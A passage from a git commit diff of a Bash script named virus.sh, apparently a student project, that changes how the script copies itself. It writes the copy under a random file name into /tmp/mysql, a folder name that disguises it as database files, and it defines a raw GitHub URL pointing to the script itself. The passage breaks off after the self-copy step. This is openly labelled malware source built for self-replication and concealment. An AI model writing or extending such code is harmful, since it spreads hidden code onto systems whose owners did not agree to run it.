274f032c4b9634046c18e97440048af47c475358
Belousov-Kirill-1ISP21 <belousov.1isp21@mail.ru>
2026-03-03 16:09:18 +0300

    6

--- virus.sh
+++ virus.sh
@@ -1,32 +1,14 @@
 #!/bin/bash
 
 GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/Belousov-Kirill-1ISP21/virus/main/virus.sh"
-MYSQL_DIRS=(
-    "/tmp/mysql"
-)
 
 generate_random_name() {
     cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1
 }
 
-find_mysql_dir() {
-    for dir in "${MYSQL_DIRS[@]}"; do
-        mkdir -p "$dir" 2>/dev/null
-        if [ -w "$dir" ]; then
-            echo "$dir"
-            return 0
-        fi
-    done
-    
-    # Если ничего не вышло, создаём в /tmp
-    mkdir -p "/tmp/mysql" 2>/dev/null
-    echo "/tmp/mysql"
-}
-
 main() {
-    MYSQL_DIR=$(find_mysql_dir)
-    RANDOM_NAME=$(generate_random_name)
-    SCRIPT_PATH="$MYSQL_DIR/$RANDOM_NAME.sh"
+    mkdir -p "/tmp/mysql"
+    SCRIPT_PATH="/tmp/mysql/$(generate_random_name).sh"
     
     if [ "$0" != "$SCRIPT_PATH" ] && [ ! -f "$SCRIPT_PATH" ]; then
         cp "$0" "$SCRIPT_PATH"
